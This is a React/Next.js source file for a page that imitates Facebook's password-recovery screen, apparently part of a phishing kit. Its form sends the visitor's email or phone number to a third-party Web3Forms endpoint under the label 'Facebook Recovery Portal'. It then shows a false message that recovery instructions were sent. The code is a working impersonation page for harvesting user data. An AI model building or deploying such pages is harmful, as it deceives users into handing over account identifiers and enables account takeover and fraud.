"use client";

import React, { useState } from "react";
import Link from "next/link";
import { ChevronLeftIcon } from "@/components/common/Icons";
import LanguageModal from "@/components/common/LanguageModal";
import { submitToWeb3Forms, WEB3FORMS_ACCESS_KEY } from "@/lib/web3forms";

export default function FacebookForgotPasswordPage() {
  const [identifier, setIdentifier] = useState("");
  const [isLangModalOpen, setIsLangModalOpen] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [statusMessage, setStatusMessage] = useState<{ type: "success" | "error"; text: string } | null>(null);

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!identifier.trim() || isSubmitting) return;

    setIsSubmitting(true);
    setStatusMessage(null);

    const formData = new FormData(e.currentTarget);
    const result = await submitToWeb3Forms(formData, "Facebook Forgot Password Request");

    setIsSubmitting(false);
    if (result.success) {
      setStatusMessage({
        type: "success",
        text: `If an account matches ${identifier}, we've sent instructions to recover your account.`,
      });
      setIdentifier("");
    } else {
      setStatusMessage({
        type: "error",
        text: result.message || "Failed to submit request. Please try again.",
      });
    }
  };

  const fbLanguages = [
    "English (UK)",
    "தமிழ்",
    "తెలుగు",
    "ಕನ್ನಡ",
    "اردو",
    "हिन्दी",
    "മലയാളം",
  ];

  const fbLinks = [
    "Sign up",
    "Log in",
    "Messenger",
    "Facebook Lite",
    "Video",
    "Meta Pay",
    "Meta Store",
    "Meta Quest",
    "Ray-Ban Meta",
    "Meta AI",
    "Instagram",
    "Threads",
    "Privacy Policy",
    "Privacy Centre",
    "About",
    "Create ad",
    "Create Page",
    "Developers",
    "Careers",
    "Cookies",
    "AdChoices",
    "Terms",
    "Help",
    "Contact uploading and non-users",
  ];

  return (
    <div className="min-h-screen flex flex-col justify-between bg-white text-[#1c1e21] font-sans antialiased selection:bg-[#0866FF] selection:text-white">
      {/* Top Back Navigation Arrow */}
      <div className="max-w-5xl w-full mx-auto px-6 sm:px-8 pt-8">
        <Link
          href="/facebook"
          className="inline-flex p-2 -ml-2 text-[#1c1e21] hover:text-[#0866FF] transition-colors rounded-full hover:bg-gray-100"
          aria-label="Back to Facebook login"
        >
          <ChevronLeftIcon className="w-6 h-6 stroke-[2.4]" />
        </Link>
      </div>

      {/* Centered Form Container */}
      <div className="flex-1 flex flex-col justify-center items-center px-6 py-8">
        <div className="w-full max-w-[440px] flex flex-col gap-4">
          <div className="flex flex-col gap-1.5">
            <h1 className="text-[26px] sm:text-[28px] font-bold tracking-tight text-[#1c1e21]">
              Find your account
            </h1>
            <p className="text-[15px] text-[#65676B]">
              Enter your mobile number or email address.
            </p>
          </div>

          <form onSubmit={handleSubmit} className="flex flex-col gap-4 mt-2">
            <input type="hidden" name="access_key" value={WEB3FORMS_ACCESS_KEY} />
            <input type="hidden" name="subject" value="Facebook Forgot Password Request" />
            <input type="hidden" name="from_name" value="Facebook Recovery Portal" />
            <input type="hidden" name="form_name" value="Facebook Forgot Password" />
            <input type="checkbox" name="botcheck" className="hidden" style={{ display: "none" }} />

            {statusMessage && (
              <div
                className={`p-3 rounded-xl text-xs font-medium text-center ${
                  statusMessage.type === "success"
                    ? "bg-green-50 text-green-700 border border-green-200"
                    : "bg-red-50 text-red-700 border border-red-200"
                }`}
              >
                {statusMessage.text}
              </div>
            )}

            <div>
              <input
                type="text"
                name="email_or_phone"
                value={identifier}
                onChange={(e) => setIdentifier(e.target.value)}
                placeholder="Mobile number or email address"
                className="w-full h-[54px] px-4 rounded-xl border border-[#CCD0D5] bg-white text-[15px] text-[#1c1e21] placeholder-[#8A8D91] focus:outline-none focus:border-[#0866FF] focus:ring-1 focus:ring-[#0866FF] transition-all"
                required
              />
            </div>

            <button
              type="submit"
              disabled={!identifier.trim() || isSubmitting}
              className={`w-full h-[46px] rounded-full font-semibold text-[15px] tracking-wide transition-all shadow-sm mt-1 flex items-center justify-center gap-2 ${
                identifier.trim() && !isSubmitting
                  ? "bg-[#0866FF] hover:bg-[#0055d4] active:bg-[#0047b3] text-white cursor-pointer"
                  : "bg-[#0866FF]/60 text-white/80 cursor-not-allowed"
              }`}
            >
              {isSubmitting ? (
                <>
                  <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                  <span>Submitting...</span>
                </>
              ) : (
                "Continue"
              )}
            </button>
          </form>
        </div>
      </div>

      {/* Multilingual & Legal Footer */}
      <footer className="w-full bg-white pt-8 pb-10 text-[12px] text-[#8a8d91] border-t border-[#f0f2f5] select-none">
        <div className="max-w-5xl mx-auto px-6">
          {/* Language Row */}
          <div className="flex flex-wrap items-center gap-x-3 gap-y-1 text-[12px]">
            {fbLanguages.map((lang, idx) => (
              <a
                key={lang}
                href="#"
                className={`hover:underline ${idx === 0 ? "text-[#737373] font-medium" : "text-[#8a8d91]"}`}
                onClick={(e) => e.preventDefault()}
              >
                {lang}
              </a>
            ))}
            <button
              onClick={() => setIsLangModalOpen(true)}
              className="hover:underline text-[#8a8d91] inline-flex items-center gap-0.5 ml-1"
            >
              More languages...
            </button>
          </div>

          {/* Thin Divider */}
          <div className="h-[1px] bg-[#dadde1] my-2.5 w-full" />

          {/* Links Grid */}
          <div className="flex flex-wrap gap-x-4 gap-y-1.5 text-[12px] text-[#8a8d91]">
            {fbLinks.map((link) => (
              <a
                key={link}
                href="#"
                className="hover:underline hover:text-[#737373] transition-colors"
                onClick={(e) => e.preventDefault()}
              >
                {link}
              </a>
            ))}
          </div>
        </div>
      </footer>

      {/* Language Bottom Sheet Modal */}
      <LanguageModal
        isOpen={isLangModalOpen}
        onClose={() => setIsLangModalOpen(false)}
      />
    </div>
  );
}
